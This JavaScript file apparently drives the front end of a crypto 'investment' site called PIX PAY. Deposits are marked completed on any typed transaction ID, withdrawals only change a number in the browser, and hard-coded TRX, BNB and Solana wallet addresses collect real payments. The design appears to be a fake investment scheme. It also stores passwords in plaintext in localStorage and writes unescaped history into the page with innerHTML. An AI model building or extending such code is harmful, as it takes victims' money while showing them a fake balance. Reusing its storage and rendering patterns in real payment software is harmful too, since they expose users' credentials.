// ==========================
// PIX PAY - PART 
// ==========================

// Default Balance
if (localStorage.getItem("balance") == null) {
    localStorage.setItem("balance", "1000");
}

// ==========================
// Register
// ==========================
function register(){

    const fullname = document.getElementById("fullname").value;
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if(fullname==="" || email==="" || password===""){
        alert("Please fill all fields.");
        return;
    }

    const user = {
        fullname: fullname,
        email: email,
        password: password
    };

    localStorage.setItem("user", JSON.stringify(user));

    alert("Registration Successful!");
    window.location.href="login.html";
}

// ==========================
// Login
// ==========================
function login(){

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const user = JSON.parse(localStorage.getItem("user"));

    if(!user){
        alert("No account found.");
        return;
    }

    if(email===user.email && password===user.password){

        localStorage.setItem("loggedIn","true");
        window.location.href="dashboard.html";

    }else{

        alert("Invalid Email or Password");

    }

}

// ==========================
// Logout
// ==========================
function logout(){

    localStorage.removeItem("loggedIn");
    window.location.href="index.html";

}

// ==========================
// Balance
// ==========================
function loadBalance(){

    let balance = Number(localStorage.getItem("balance")) || 0;

    let balanceText = document.getElementById("balance");

    if(balanceText){
        balanceText.innerHTML = "$" + balance.toFixed(2);
    }

}

// ==========================
// Deposit
// ==========================
function submitDeposit(){

    let amount = Number(document.getElementById("amount").value);
    let txid = document.getElementById("txid").value;
    let receipt = document.getElementById("receipt").files.length;
    let network = document.getElementById("network").value;

    if(amount<=0 || txid==="" || receipt==0){
        alert("Please complete all fields.");
        return;
    }

    let balance = Number(localStorage.getItem("balance"));
    balance += amount;

    localStorage.setItem("balance", balance);

    let history = JSON.parse(localStorage.getItem("history")) || [];

    history.push({
        type:"Deposit",
        network:network.toUpperCase(),
        amount:amount,
        status:"Completed",
        date:new Date().toLocaleString()
    });

    localStorage.setItem("history", JSON.stringify(history));

    loadBalance();

    alert("Deposit Successful!");

}

// ==========================
// Withdraw
// ==========================
function submitWithdraw(){

    let amount = Number(document.getElementById("amount").value);

    let balance = Number(localStorage.getItem("balance"));

    if(amount<=0){
        alert("Enter valid amount");
        return;
    }

    if(amount>balance){
        alert("Insufficient Balance");
        return;
    }

    balance -= amount;

    localStorage.setItem("balance", balance);

    let history = JSON.parse(localStorage.getItem("history")) || [];

    history.push({
        type:"Withdraw",
        amount:amount,
        date:new Date().toLocaleString()
    });

    localStorage.setItem("history", JSON.stringify(history));

    loadBalance();

    alert("Withdraw Successful!");

        }
// ==========================
// Buy Investment Plan
// ==========================
function buyPlan(price){

    let balance = Number(localStorage.getItem("balance")) || 0;

    if(balance < price){
        alert("Not enough balance!");
        return;
    }

    if(!confirm("Buy $" + price + " Investment Plan?")){
        return;
    }

    balance -= price;

    localStorage.setItem("balance", balance);

    let history = JSON.parse(localStorage.getItem("history")) || [];

    history.push({
        type:"Investment",
        amount:price,
        date:new Date().toLocaleString()
    });

    localStorage.setItem("history", JSON.stringify(history));

    loadBalance();

    alert("Investment Successful!");

}

// ==========================
// History
// ==========================
function loadHistory(){

    let history = JSON.parse(localStorage.getItem("history")) || [];

    let historyList = document.getElementById("historyList");

    if(!historyList) return;

    if(history.length===0){
        historyList.innerHTML="<p>No History Found.</p>";
        return;
    }

    let html="";

    history.slice().reverse().forEach(function(item){

        html += `
        <div class="card" style="margin-top:15px;">
            <h3>${item.type}</h3>

            ${item.network ? `<p><b>Network:</b> ${item.network}</p>` : ""}

            <p><b>Amount:</b> $${item.amount}</p>

            ${item.status ? `<p><b>Status:</b> ${item.status}</p>` : ""}

            <p><b>Date:</b> ${item.date}</p>

        </div>
        `;

    });

    historyList.innerHTML = html;

}

// ==========================
// Wallet Address
// ==========================
function changeWallet(){

    let network = document.getElementById("network").value;

    let wallet = document.getElementById("walletAddress");

    let qr = document.getElementById("walletQR");

    let address="";

    switch(network){

        case "trx":
            address="TCuA1a25GMckqtgu3KAXW3bBxu4kgSatfJ";
            break;

        case "bnb":
            address="0x6680AF9efF2dE9f9bfAbac09520Bd8Fb1F5f6E0a";
            break;

        case "bsc":
            address="0x6680AF9efF2dE9f9bfAbac09520Bd8Fb1F5f6E0a";
            break;

        case "sol":
            address="FHYuDadDJfRKQrLNWXCHsZUbxZMDA1JybnFQmSvZnPfC";
            break;

        case "usdtsol":
            address="FHYuDadDJfRKQrLNWXCHsZUbxZMDA1JybnFQmSvZnPfC";
            break;
    }

    wallet.textContent = address;

    if(qr){
        qr.src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data="+encodeURIComponent(address);
    }

}

// ==========================
// Copy Address
// ==========================
function copyAddress(){

    let address=document.getElementById("walletAddress").textContent;

    navigator.clipboard.writeText(address);

    alert("Address Copied!");

}

// ==========================
// Auto Load
// ==========================
window.onload=function(){

    loadBalance();

    if(document.getElementById("network")){
        changeWallet();
    }

    if(document.getElementById("historyList")){
        loadHistory();
    }

};
function loadStats(){

    let history = JSON.parse(localStorage.getItem("history")) || [];

    let deposit = 0;
    let withdraw = 0;
    let investment = 0;

    history.forEach(function(item){

        if(item.type === "Deposit"){
            deposit += Number(item.amount);
        }

        if(item.type === "Withdraw"){
            withdraw += Number(item.amount);
        }

        if(item.type === "Investment"){
            investment += Number(item.amount);
        }

    });

    if(document.getElementById("totalDeposit")){
        document.getElementById("totalDeposit").textContent = "$" + deposit.toFixed(2);
    }

    if(document.getElementById("totalWithdraw")){
        document.getElementById("totalWithdraw").textContent = "$" + withdraw.toFixed(2);
    }

    if(document.getElementById("totalInvestment")){
        document.getElementById("totalInvestment").textContent = "$" + investment.toFixed(2);
    }

}
